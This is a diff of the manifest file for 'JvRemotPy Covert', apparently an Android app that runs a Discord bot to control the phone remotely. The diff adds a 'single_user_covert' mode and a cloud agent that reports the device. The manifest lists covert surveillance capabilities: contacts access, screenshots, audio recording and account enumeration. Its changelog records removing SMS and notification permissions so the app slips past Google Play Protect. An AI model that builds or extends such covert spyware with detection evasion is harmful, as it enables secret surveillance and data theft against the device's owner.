@@ -1,14 +1,14 @@
 {
-  "version": "11.0.0",
-  "schema_version": 2,
-  "generated_at": "2026-09-29T06:00:00Z",
+  "version": "16.0.0",
+  "schema_version": 3,
+  "generated_at": "2026-10-02T00:00:00Z",
   "min_app_version": "1.0",
-  "min_python_version": "3.11",
+  "min_python_version": "3.10",
   "min_discord_py": "2.4.0",
 
   "info": {
-    "name": "JvRemotPy Core Scripts",
-    "description": "Discord bot runtime for Android via Chaquopy — 75+ commands",
+    "name": "JvRemotPy Covert — Python Scripts",
+    "description": "Discord bot runtime for Android via Chaquopy — single-user covert mode",
     "author": "Hawkmoth609",
     "repository": "https://github.com/Hawkmoth609/JvRemotPy",
     "license": "MIT"
@@ -18,6 +18,7 @@
     "main.py",
     "hawkmoth_bot.py",
     "bridge.py",
+    "cloud_agent.py",
     "file_browser.py",
     "modules/__init__.py",
     "modules/helpers.py"
@@ -30,29 +31,41 @@
     "stop_function": "stop_bot",
     "status_function": "get_bot_status",
     "version_function": "get_version",
-    "file_browser_module": "file_browser"
+    "health_function": "health_check",
+    "diagnose_function": "diagnose",
+    "file_browser_module": "file_browser",
+    "cloud_agent_module": "cloud_agent"
   },
 
   "dependencies": {
     "discord.py": ">=2.4.0,<3.0.0",
-    "aiohttp": ">=3.10.0,<4.0.0",
+    "aiohttp": ">=3.8.0,<4.0.0",
     "requests": ">=2.32.0,<3.0.0",
     "Pillow": ">=10.0.0"
   },
 
   "metadata": {
-    "total_files": 6,
-    "python_version": "3.11",
-    "chaquopy_version": "15.0.1",
+    "total_files": 7,
+    "python_version": "3.10",
+    "chaquopy_version": "17.0.0",
     "target_android_api": 34,
     "min_android_api": 26,
-    "command_count": 75
+    "command_count": 75,
+    "mode": "single_user_covert",
+    "cloud_enabled": true
   },
 
   "capabilities": {
     "discord_bot": true,
     "slash_commands": true,
     "prefix_commands": true,
+
+    "cloud_integration": {
+      "cloud_agent": true,
+      "session_check": true,
+      "command_audit": true,
+      "device_reporting": true
+    },
 
     "file_browser": true,
     "file_browser_v2": true,
@@ -71,7 +84,6 @@
     },
 
     "contacts_access": true,
-    "contacts_write": true,
     "contacts_bridge_class": "com.example.myfirstapp.ContactsBridge",
 
     "screenshot": true,
@@ -171,82 +183,43 @@
 
   "changelog": [
     {
+      "version": "16.0.0",
+      "date": "2026-10-02",
+      "breaking": false,
+      "changes": [
+        "🆕 cloud_agent.py v1.0 — جسر Python ↔ Supabase:",
+        "   • log_command() — تسجيل أوامر (audit)",
+        "   • get_session_status() — حالة bot_session",
+        "   • is_my_session_active() — هل أنا النشط؟",
+        "   • report_bot_running() — إبلاغ حالة البوت",
+        "",
+        "🔄 main.py v16.0:",
+        "   • cloud_agent integration",
+        "   • context + device_id parameters",
+        "   • health_check() API",
+        "   • diagnostics محسّن",
+        "",
+        "🔄 bridge.py v9.0:",
+        "   • get_cloud_status()",
+        "   • get_session_info()",
+        "   • is_my_session_active()",
+        "   • report_command()",
+        "",
+        "🔄 manifest.json v16.0:",
+        "   • schema_version = 3",
+        "   • cloud_integration capabilities",
+        "   • update metadata"
+      ]
+    },
+    {
       "version": "11.0.0",
       "date": "2026-09-29",
       "breaking": false,
       "changes": [
-        "🆕 file_browser.py v2.0 — نظام تصفح متقدم:",
-        "   • Natural Sort (file2 قبل file10)",
-        "   • Breadcrumb navigation",
-        "   • Search Modal داخل المجلد",
-        "   • Jump-to-path Modal",
-        "   • Filters: images/videos/audio/docs/apk/folders",
-        "   • Sort modes: name/date/size/type",
-        "   • Toggle الملفات المخفية",
-        "   • Recent Folders (آخر 10)",
-        "   • Timeout-safe listing (5s)",
-        "   • Path safety (realpath + prefix check)",
-        "   • ZIP للمجلد الحالي",
-        "",
-        "🎤 AudioRecorder v4.0 — نظام تسجيل متقدم:",
-        "   • State Machine: IDLE/PREPARING/RECORDING/PAUSED/STOPPING",
-        "   • Pause/Resume على Android 7+",
-        "   • Format Fallback: MP4/AAC → 3GP/AMR → MP4/AMR",
-        "   • Amplitude Monitoring (مستوى الصوت اللحظي)",
-        "   • Recording History (آخر 10)",
-        "   • Statistics (عدد + مدة إجمالية)",
-        "   • Cleanup تلقائي للملفات القديمة",
-        "   • Validation (حجم أدنى + حذف الفارغ)",
-        "",
-        "🔑 AccountsHelper v3.0 — تصنيف ذكي:",
-        "   • 8 فئات: email/messaging/social/cloud/financial/gaming/system/other",
-        "   • كشف 40+ نوع حساب",
-        "   • إحصائيات حسب الفئة والنوع",
-        "   • Grouped View",
-        "   • Search بالاسم",
-        "   • Sort: name/type/category",
-        "   • فحص التطبيق المرتبط",
-        "",
-        "🛡️ hawkmoth_bot.py v5.0 — تحسينات جذرية:",
-        "   • Decorator System: @require_allowed, @require_bridge, @with_stats, @require_android_min",
-        "   • AndroidVersion Detection (SDK + manufacturer)",
-        "   • Unified Error Handling",
-        "   • Command Categories (12 فئة)",
-        "   • Beautiful /start with 'Moayed' banner",
-        "   • أزرار جديدة: /record_pause, /record_resume, /record_history",
-        "   •   /record_stats, /record_cleanup, /record_amplitude",
-        "   •   /accounts_stats, /accounts_grouped",
-        "   • Fallback للـ FileBrowser القديم",
-        "   • زمن استجابة أسرع + استقرار أعلى",
-        "",
-        "✅ 75+ أمرًا منظّمة حسب الفئة",
-        "✅ دعم كامل API 23 → 34+",
-        "✅ Play Protect Safe"
-      ]
-    },
-    {
-      "version": "10.0.0",
-      "date": "2026-09-28",
-      "breaking": true,
-      "changes": [
-        "🔴 إزالة الصلاحيات المحظورة من Google Play Protect:",
-        "   - READ_SMS / RECEIVE_SMS / SEND_SMS",
-        "   - RECEIVE_MMS / RECEIVE_WAP_PUSH",
-        "   - BIND_NOTIFICATION_LISTENER_SERVICE",
-        "🔴 حذف أوامر /sms /send_sms /notifications /notif_watch",
-        "🔴 حذف NotifReader.java بالكامل",
-        "✅ إضافة صلاحيات جديدة (لا يحظرها Play Protect)",
-        "✅ إضافة Helpers جديدة"
-      ]
-    },
-    {
-      "version": "8.0.0",
-      "date": "2026-09-27",
-      "breaking": false,
-      "changes": [
-        "🔴 إصلاح extractPackages 'aiohttp' (SIGSEGV على هواوي)",
-        "🟡 تبسيط MainActivity",
-        "🟢 توحيد معمارية الإصدارات"
+        "🆕 file_browser.py v2.0",
+        "🎤 AudioRecorder v4.0",
+        "🔑 AccountsHelper v3.0",
+        "🛡️ hawkmoth_bot.py v5.0"
       ]
     }
   ],
@@ -258,7 +231,7 @@
       "main.py",
       "hawkmoth_bot.py",
       "bridge.py",
-      "file_browser.py"
+      "cloud_agent.py"
     ]
   }
 }
